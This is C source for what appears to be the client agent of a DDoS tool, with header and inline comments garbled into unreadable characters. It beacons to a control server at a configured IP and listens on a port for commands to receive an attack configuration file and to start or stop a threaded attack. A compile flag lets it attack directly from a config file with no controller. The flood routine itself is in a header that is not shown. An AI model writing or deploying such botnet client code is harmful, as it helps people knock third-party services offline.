/********************************************************************************/
/* ddos�����Ŀͻ��˳���                                                         */
/* ���̳߳���                                                                 */
/*            ip���:ÿ��һ��ʱ������ƶ˷��ͱ���ip                             */
/*            ��������:�ȴ����ƶ˷��Ϳ�������                                   */
/*            ���𹥻�:�������ý��й���                                         */
/********************************************************************************/
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "globalData.h"
#include "attack.h"
#include "getconfigfromtext.h"
int pthread_shutdown;
/********************************************************************************/
/* ��ʼ��ȫ�����ò���                                                           */
/* ����:1ʧ��;0��ʼ���ɹ�                                                       */
/********************************************************************************/
int init()
{
	printf("Version: %s\n",VERSION);
	int ret;
	char mess_conf[5][VALUE_MAX_LENGTH];//5Ϊ��������
	ret = GetAllConfig("config",&mess_conf[0][0],5);//���ǰ5�����ò�����ֵ
	if(!ret){
		printf("X Error:get init config error.\n");
		return 1;
	}
	strcpy(server_ip,mess_conf[0]);
	port_server = atoi(mess_conf[1]);
	port_server_sendip = atoi(mess_conf[2]);
	port_server_sendresult = atoi(mess_conf[3]);
	wait_time = atoi(mess_conf[4]);
	//printf("%s,%d,%d,%d,%d\n",server_ip,port_server,port_server_sendip,port_server_sendresult,wait_time);
	
	printf("Action: init success.\n");
	return 0;
}
/********************************************************************************/
/* ÿ��һ��ʱ�����ŷ������ͱ���ip                                               */
/* ����:1����ʧ��;0���ͳɹ�                                                     */
/********************************************************************************/
void *sendIp()
{
	struct sockaddr_in server_addr;
	int sockfd;
	if( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0){
        printf("X Waring: send ip:create socket failed.\n");
    }
	bzero(&server_addr,sizeof(server_addr));
    server_addr.sin_family = AF_INET;
	if(inet_aton(server_ip,&server_addr.sin_addr) == 0){
    	printf("X Waring: send ip:server ip address wrong.\n");
    }
	server_addr.sin_port = htons(port_server_sendip);
	while(1){
    	if(connect(sockfd,(struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
	        printf("X Waring: send ip:can not connect to %s.\n",server_ip);
	    }
		else{
			send(sockfd,"connect",7,0);
		}
		sleep(wait_time);
	}
	close(sockfd);
}

int main(int argc,char *argv[])
{
	#ifndef DDOS_NO_CONTROL_ON
	if(init()){
		printf("[Error] init error.\n");
		exit(1);
	}
	#endif
	#if (!defined DDOS_NO_CONTROL_ON)&&(!defined DDOS_NO_SEND_IP)
	//�������߳�����ÿ��һ��ʱ�����ŷ������ͱ���ip
	pthread_t pid;
	int err;
	err=pthread_create(&pid,NULL,sendIp,NULL);
	if(err!=0){
		printf("X Error: create pthread to send ip error.\n");
		exit(1);
	}
	#endif
	#ifndef DDOS_NO_CONTROL_ON
	//��������,��ȡ���ƶ�����
	struct sockaddr_in server_addr;
	struct sockaddr_in client_addr;
	int server_socket,new_server_socket;
    socklen_t length;
    if((server_socket=socket(PF_INET,SOCK_STREAM,0)) < 0){
        printf("X Error: create socket to connect control server failed.\n");
        exit(1);
    }
	bzero(&server_addr,sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htons(INADDR_ANY);
    server_addr.sin_port = htons(port_server);
    if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr))==-1){
        printf("X Error: bind port : %d failed.\n", port_server); 
        exit(1);
    }
    if ( listen(server_socket, LENGTH_OF_LISTEN_QUEUE) == -1 ){
    	printf("X Error: listen from control server failed.\n");
        exit(1);
    }
    while (1) 
    {
		pthread_t pid_attack;
		pthread_attr_t attr;
        length = sizeof(client_addr);
        new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
        if ( new_server_socket < 0){
            printf("X Error: accept from control server failed.\n");
            break;
        }
        char buffer[BUFFER_SIZE];
        bzero(buffer, BUFFER_SIZE);
        length = recv(new_server_socket,buffer,BUFFER_SIZE,0);
        if (length < 0){
            printf("X Error: recieve command from control server failed.\n");
            break;
        }
        char str_get[MAX_SIZE+1];
        bzero(str_get, MAX_SIZE+1);
        strncpy(str_get, buffer, strlen(buffer)>MAX_SIZE?MAX_SIZE:strlen(buffer));
		if(strcmp(str_get,"get_configFile")==0) { //���������ļ�
			send(new_server_socket,"ok:get_configFile",17,0);
			FILE * fp = fopen("attackconfig.xml","w");
			if(fp == NULL){
				printf("X Error: File:can't open file attackconfig.xml to write.\n");
        		break;
			}
			bzero(buffer,BUFFER_SIZE);
			int recvlength = 0;
			int write_length = 0;
			int flag_write_config = 0;
			while((recvlength=recv(new_server_socket,buffer,BUFFER_SIZE,0))>0){
				//if(!strcmp(buffer,"::over:send_configFile"))
				//	break;
        		write_length = fwrite(buffer,sizeof(char),recvlength,fp);
        		if (write_length<recvlength){
            		printf("X Error: write to file attackconfig.xml failed.\n");
					flag_write_config = 1;
        		}
				//printf("%s",buffer);
        		bzero(buffer,BUFFER_SIZE);    
			}
			if(write_length==0){
				printf("X Error: write to file attackconfig.xml failed.\n");
				flag_write_config = 1;
			}
			fclose(fp);
			if(!flag_write_config){
				printf("Action: Recieve File attackconfig.xml From WebControl Finished.\n");
				//send(new_server_socket,"ok:over_configFile",18,0);//�����˷����ļ�����ɹ����ı�ʾ
			}
			else{
				//send(new_server_socket,"failed:over_configFile",22,0);
			}
		}
		else if(strcmp(str_get,"exec_startAttack")==0) { //��ʼ����
			pthread_shutdown=0;
			int err_attack;
			pthread_attr_init(&attr);
			pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
			err_attack=pthread_create(&pid_attack,&attr,startAttack,"attackconfig.xml");
			pthread_attr_destroy(&attr);
			if(err_attack!=0){
				printf("X Error: create pthread error.\n");
				send(new_server_socket,"failed:start_attack",19,0);
				//exit(1);
			}else{
				send(new_server_socket,"ok:get_exec",11,0);//�����Ѿ����յ�����,����ִ�й����Ľ������attackResult.txt�ļ���
			}
		}
		else if(strcmp(str_get,"exec_stopAttack")==0) { //��;ֹͣ����
			pthread_shutdown=1;
			printf("Action: Attacking is stopping...\n");
			send(new_server_socket,"ok:get_exec",11,0);
		}
		else { //�������������
			printf("X Error: get command wrong.\n");
		}
        close(new_server_socket);//�ر���ͻ��˵�����
    }
	//�رռ����õ�socket
	close(server_socket);
	#endif
	#ifdef DDOS_NO_CONTROL_ON
	if(argc==1)
		startAttack("attackconfig.xml");
	else
		startAttack(argv[1]);
	#endif
	return 0;
}

